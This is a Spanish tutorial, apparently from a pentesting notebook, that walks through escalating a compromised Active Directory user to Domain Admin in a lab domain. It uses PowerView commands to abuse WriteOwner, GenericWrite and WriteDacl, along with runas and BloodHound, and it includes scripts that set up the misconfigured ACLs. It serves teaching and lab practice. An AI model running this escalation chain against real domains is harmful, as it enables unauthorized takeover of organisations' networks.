---
icon: burst
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Explotación de ACLs vulnerables

Para que nos se sobreponga una informacion con otra, vamos a borrar la base de datos del `BloodHound` y vamos a volver a descargar con la herramienta de `BloodHound` en `Windows` la base de datos para cargarla de 0, primero tendremos que hacer un cambio en el `DC` y sera añadir al grupo de `Proyect Management` el grupo llamado `Accounting`, despues añadimos al grupo `Proyect Management` el grupo `Office Admins`, tambien vamos añadir a 4 usuarios al grupo de `Accounting`, uno de ellos tiene que llevar en la descripcion su contraseña en este caso `Passw0rd5`, resetearle la contraseña a esa misma y una vez echo eso, nos descargamos la base de datos para el `BloodHound`.

Esto lo hacemos por que en un caso real puede ser asi perfectamente ya que muchos usuarios tienen en la descripcion su contraseña para que el otro que venga sepa cual es, pero es una mala practica que muchas empresas siguen.

Nos pasamos el `ZIP` al `kali` y antes de cargarlo borramos la base de datos:

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Una vez borrada, cargamos el `ZIP` y buscamos lo siguiente.

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

Por lo que veremos algo asi:

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

Pongamos que en el grupo que estamos viendo de `Accounting` nos esta desglosando los 7 usuarios que estan dentro de dicho grupo, pero pongamos que tenemos comprometida la maquina del usuario `Annice` que esta dentro del grupo `Accounting`, podremos hacer lo siguiente para escalar privilegios.

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

Pero si por ejemplo queremos utilizar otro grupo por que este script te genera todo de forma aleatoria, podremos hacerlo con otro, como por ejemplo con el grupo `SALES`, imaginemos que de ese grupo tenemos comprometida la maquina del usuario `Kettie` podremos hacer diversas cosas, pero vamos a volver a donde estabamos con el de `Accounting` pongamos que tenemos esta estructura de permisos:

```
Usuario -> Grupo Accounting -> GenericWrite al grupo Proyect Management -> GenericWrite al grupo Office Admin -> Member of Administradores de empresas -> WriteDacl al grupo Admins del dominio
```

Si vemos que permisos tienen los grupos sobre el grupo de `Project Management`, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Entre ellos esta `Accounting` que puede hacer un `GenericWrite` a dicho grupo.

Por lo que vamos a intentar convertir el usuario `Annice` del grupo de `Accounting` en un usuario `Administrador`.

Como sabemos que su contraseña es `Passw0rd5` ya que lo tiene apuntado, podremos acceder a dicho usuario, sabemos que este usuario actualmente no tiene ningun privilegio de administrador, pero vamos a intentar escalar de la siguiente forma.

Mas adelante explotaremos el privilegio de `GenericWrite`, por lo que podemos ver el grupo `Accounting` tambien tiene el privilegio de `WriteOwner`, por lo que vamos a explotar dicho privilegio.

Si no os aparece `WriteOwner` tendremos que hacer lo siguiente en un `PowerShell` del `DC`:

```powershell
Get-ADObject -Filter { Name -eq "Project Management" } -Properties DistinguishedName
```

Info:

```
DistinguishedName                               Name               ObjectClass ObjectGUID
-----------------                               ----               ----------- ----------
CN=Project management,CN=Users,DC=corp,DC=local Project management group       3cdf74f5-a3a1-4a9a-9974-78905eb15a53
```

Sabiendo la ruta absoluta, pondremos el siguiente script en `.ps1`.

```powershell
# Grupo que recibirá permisos
$principal = "Accounting"

# Distinguished Name del objeto de destino (Project Management)
$targetDN = "CN=Project management,CN=Users,DC=corp,DC=local"

# Obtener objeto de destino
$targetObject = Get-ADObject -Filter { DistinguishedName -eq $targetDN }
if (-not $targetObject) {
    Write-Host "El objeto objetivo no fue encontrado. Verifica el DN." -ForegroundColor Red
    return
}

# Obtener ACL del objeto de destino
try {
    $acl = Get-Acl -Path "AD:$($targetObject.DistinguishedName)"
    if (-not $acl) {
        Write-Host "No se pudo obtener la ACL. Verifica los permisos y la conexión." -ForegroundColor Red
        return
    }
} catch {
    Write-Host "Error al obtener ACL: $_" -ForegroundColor Red
    return
}

# Crear un nuevo Access Control Entry (ACE) para WriteOwner
try {
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        (New-Object System.Security.Principal.NTAccount($principal)), # Nombre del grupo que recibirá el permiso
        "WriteOwner",                                                 # Permiso: WriteOwner
        "Allow"                                                       # Acción: Permitir
    )
} catch {
    Write-Host "Error al crear el ACE: $_" -ForegroundColor Red
    return
}

# Agregar el ACE a la ACL
try {
    $acl.AddAccessRule($ace)
} catch {
    Write-Host "Error al agregar el ACE a la ACL: $_" -ForegroundColor Red
    return
}

# Aplicar los cambios en la ACL
try {
    Set-Acl -Path "AD:$($targetObject.DistinguishedName)" -AclObject $acl
    Write-Host "Permiso WriteOwner añadido exitosamente." -ForegroundColor Green
} catch {
    Write-Host "Error al aplicar ACL: $_" -ForegroundColor Red
}
```

Y si comprobamos los permisos...

```powershell
(Get-Acl -Path "AD:CN=Project management,CN=Users,DC=corp,DC=local").Access | Where-Object { $_.IdentityReference -like "*Accounting*" }
```

Info:

```
ActiveDirectoryRights : GenericWrite, WriteOwner
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : CORP\accounting
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

Vemos efectivamente que tiene el `GenericWrite` y el `WriteOwner`.

Por lo que si importamos de nuevo la base de datos al `BloodHound` veremos algo asi:

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Ahora veremos 2 lineas apuntando al `Project Managment` una siendo `GenericWrite` y la otra `OwnerWrite`.

Por lo que vamos a ver como explotar la vulnerabilidad de `WriteOwner`.

### Acceder desde un equipo de un usuario de Windows mediante terminal a otro usuario del dominio

Lo que vamos hacer primeramente es saber como acceder a la cuenta de otro usuario cuando ya previamente estamos en la cuenta de un usuario en un equipo de `Windows` como por ejemplo puede ser `empleado1`y queremos acceder a la cuenta de `Annice`.

Lo que vamos hacer es buscar `C:\Windows\System32\WindowsPowerShell\v1.0` en la carpeta y en el ejecutable de `PowerShell.exe` le daremos a `Shift` + Click derecho y nos aparecera esto:

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

Le daremos a `Ejecutar como otro usuario`.

Metemos como usuario `annice.mable` y la contraseña que era `Passw0rd5`.

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

Y vemos que estamos con dicho usuario:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Si por ejemplo no tubieramos acceso a la interfaz grafica y solo por terminal, podremos hacer lo mismo pero de la siguiente forma:

```powershell
runas /user:corp\annice.mable powershell
```

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

Y se nos abrira un `powershell` como el usuario que especificamos como podremos ver.

Pero no podremos listar los archivo del `empleado1` ya que no tenemos permiso, por lo que recomiendo hacer lo siguiente ya que tenemos el script en dicho usuario, podremos hacer que este usuario `annice` tenga permisos para ello en el escritorio del `empleado1` para que asi podamos cargar el script bajo el `TOKEN` del usuario `annice`.

```powershell
cd ./Desktop
runas /user:corp\annice.mable /netonly powershell
```

Esto nos abrira la terminal bajo el usuario `annice` y si probamos a listar los archivos...

```powershell
cd C:\Users\empleado1\Desktop\
ls
```

Info:

```
Directorio: C:\Users\empleado1\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/01/2025     12:16          18175 20250112121622_BloodHound.zip
-a----        07/01/2025     21:33         532856 new_powerview.ps1
-a----        07/01/2025     21:20         770279 PowerView.ps1
-a----        11/01/2025     11:41        1308764 sh.ps1
-a----        12/01/2025     12:16          24786 Yjc5NGZkZjMtMWQ5Ny00ZTUzLTg5ZjktODAzMDI2ZDgxZDI3.bin
```

Vemos que ahora si nos deja, por lo que vamos a cargar el script de `PowerView` para utilizarlo.

```powershell
. .\new_powerview.ps1
```

Lo que vamos hacer es que mediante una vulnerabilidad con el `WriteOwner` hagamos que el usuario `anncie` sea del grupo `Project Managment`.

Si nosotros nos vamos a la informacion de lo que puede hacer este permiso:

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

Y si nos vamos a la pestaña `Windows Abuse` podremos ver como abusar de estos permisos para poder conseguir nuestro objetivo dandonos varias opciones de comandos.

Antes de ejecutar el comando para abusar de estos permisos, vamos a enumerar los grupos del dominio con el `PowerShell` del `empleado1` de la siguiente forma:

```powershell
cd .\Desktop
. .\new_powerview.ps1
Get-DomainGroup | select name
```

Info:

```
name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Incoming Forest Trust Builders
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
Office Admin
IT Admins
Executives
Senior management
Project management
marketing
sales
accounting
```

Lo que vamos hacer ahora es intentar meternos nosotros como `Owners` del grupo `Project management` que estamos identificando en la informacion del anterior comando gracias a ese privilegio que tenemos del `WriteOwner` que tenemos desde el grupo `Accounting`.

### Elevacion a grupo Project management mediante el permiso OwnerWrite

Por lo que vamos a utilizar el siguiente comando en la `PowerShell` de `Annice`:

```powershell
Set-DomainObjectOwner -Identity "Project management" -OwnerIdentity annice.mable
```

Aqui le estamos diciendo que nos meta un nuevo `Owner` en el grupo `Project management` en concreto le especificamos que sea al usuario `Annice`.

Y cuando lo ejecutemos no nos mostrara nada de informacion, ningun error ni nada, eso significa que se realizo correctamente.

Ahora para comprobarlo si nos vamos a nuestro `DC` y nos vamos a donde estan las `ACLs` y los grupos en el grupo de `Project management`, vamos a `seguridad` y en las opciones `avanzadas` donde estan todos estos permisos, si antes era el `Owner` `Admins. del dominio` ahora tendremos que ver que es `Annice`:

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Vemos como se cambio correctamente, siendo un usuario sin ningun privilegio.

Ahora lo que vamos hacer es crear una `ACL` que nos permita escribir/añadir un miembro dentro del grupo `Project management`:

```powershell
Add-DomainObjectAcl -TargetIdentity "Project management" -Rights WriteMembers -PrincipalIdentity annice.mable
```

Esto igual no deberia de dar ningun error y ningun resultadom, pero si ahora nos volvemos a ir a nuestro `DC` tendremos que ver la nueva `ACL` en el grupo de `Project management`.

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Vemos que se ha creado correctamente, por lo que ahora si ponemos el siguiente comando para añadir un miembro a dicho grupo que sera el de `annice` nuestro usuario ya que añadimos una `ACL` que nos permite hacer eso, veremos que podremos añadirlo de forma correcta.

```powershell
Add-DomainGroupMember -Identity "Project management" -Members annice.mable
```

Antes de darle a ejecutar, vemos que si en nuestro `DC` nos vamos a ver el usuario `annice` de que grupo es, vemos que solo es de `Domains Users` y `Accounting`, pero cuando ejecutemos ese comando, tendremos que ver que se añadie el de `Project management`:

> Antes de ejecutar el comando:

<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

> Despues de ejecutar el comando:

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado correctamente.

Ahora vamos a explotar la vulnerabilidad del permiso `GenericWrite` del grupo `Project management` al de `Office Admins`.

Para ello el que no lo tenga configurado de esa forma, tendremos que ejecutar lo siguiente para que sea asi en el `DC`:

```powershell
# Nombre del grupo que recibirá el permiso
$principal = "Project management"

# Distinguished Name del grupo de destino
$targetDN = "CN=Office Admin,CN=Users,DC=corp,DC=local"

# Obtener ACL del objeto de destino
$acl = Get-Acl -Path "AD:$targetDN"

# Crear el ACE para WriteOwner
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    (New-Object System.Security.Principal.NTAccount($principal)), # Grupo destino
    "GenericWrite",                                               # Permiso específico
    "Allow"                                                       # Acción: Permitir
)

# Agregar el ACE a la ACL
$acl.AddAccessRule($ace)

# Aplicar los cambios a la ACL
Set-Acl -Path "AD:$targetDN" -AclObject $acl
```

```powershell
(Get-Acl -Path "AD:CN=Office Admin,CN=Users,DC=corp,DC=local").Access | Where-Object { $_.IdentityReference -like "*Project management*" }
```

Info:

```
ActiveDirectoryRights : GenericWrite
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : CORP\Project management
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

Vemos que se configuro todo de forma correcta y si volvemos a cargar nuestra base de datos en `BloodHound` veremos esto asi:

<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

Por lo que se podra explotar ese `GenericWrite` de la siguiente forma.

Esto lo que nos permite hacer es añadir directamente miembros en un grupo, que en este caso seria en el de `Office Admin`.

### Elevacion a grupo Office Admin mediante el permiso GenericWrite

Tendremos que cerrar la consola de `Annice` y volverla abrir como hicimos antes.

```powershell
runas /user:corp\annice.mable /netonly powershell
```

```powershell
cd C:\Users\empleado1\Desktop\
. .\new_powerview.ps1
Add-DomainGroupMember -Identity "Office Admin" -Members annice.mable
```

Y si no nos salio ningun error y ningun resultado significa que fue todo bien, por lo que si vamos al `DC` y vemos si se configuro de forma correcta...

<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

Vemos que esta añadida correctamente, por lo que ya pertenecemos al grupo `Office Admin`.

Como dentro de este grupo hereda los privilegios de `Administradores de empresa` no haria falta que hicieramos nada, pero si llegamos a `Administradores de empresa` para poder llegar a `Admins del dominio` veremos que esta con permisos de `WriteDacl` y vamos a ver como explotar esto, pero si no lo tuvierais asi configurado, se haria de la siguiente forma en el `DC`:

```powershell
# Nombre del grupo que recibirá el permiso
$principal = "Enterprise Admins"

# Distinguished Name del grupo de destino
$targetDN = "CN=Domain Admins,CN=Users,DC=corp,DC=local"

# Obtener ACL del objeto de destino
$acl = Get-Acl -Path "AD:$targetDN"

# Crear el ACE para WriteOwner
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    (New-Object System.Security.Principal.NTAccount($principal)), # Grupo destino
    "WriteDacl",                                                  # Permiso específico
    "Allow"                                                       # Acción: Permitir
)

# Agregar el ACE a la ACL
$acl.AddAccessRule($ace)

# Aplicar los cambios a la ACL
Set-Acl -Path "AD:$targetDN" -AclObject $acl
```

```powershell
(Get-Acl -Path "AD:CN=Domain Admins,CN=Users,DC=corp,DC=local").Access | Where-Object { $_.IdentityReference -like "*Enterprise Admins*" }
```

Info:

```
ActiveDirectoryRights : CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl,
                        WriteOwner
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : CORP\Enterprise Admins
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

Y en el `BloodHound` se tendra que ver algo asi:

<figure><img src="../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

Lo que nos permite hacer este `WriteDacl` es añadir una `DACL` directamente al grupo `DOMAIN ADMINS` por lo que haremos lo siguiente.

### Elevacion a grupo Domain Admins mediante el permiso WriteDacl

Tendremos que reiniciar la consola como hicimos antes...

```powershell
runas /user:corp\annice.mable /netonly powershell
```

```powershell
cd C:\Users\empleado1\Desktop\
. .\new_powerview.ps1
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights WriteMembers -PrincipalIdentity annice.mable
```

Y si no nos salio ningun error y ningun resultado significa que fue todo bien, ahora si lo comprobamos en nuestro `DC` tendremos que ver lo siguiente:

<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

Veremos que se añadio correctamente, por lo que podremos hacer lo siguiente.

Nos vamos añadir a nosotros mismo al grupo de `Domain Admins` ya que añadimos una `ACL` en la cual podemos hacer eso.

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members annice.mable
```

Y si no nos salio ningun error y ningun resultado significa que fue todo bien, si vamos a comprobarlo en nuestro `DC` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

Vemos que funciono correctamente y ahora este usuario es `Admin del dominio` por lo que tendremos el control total del dominio.
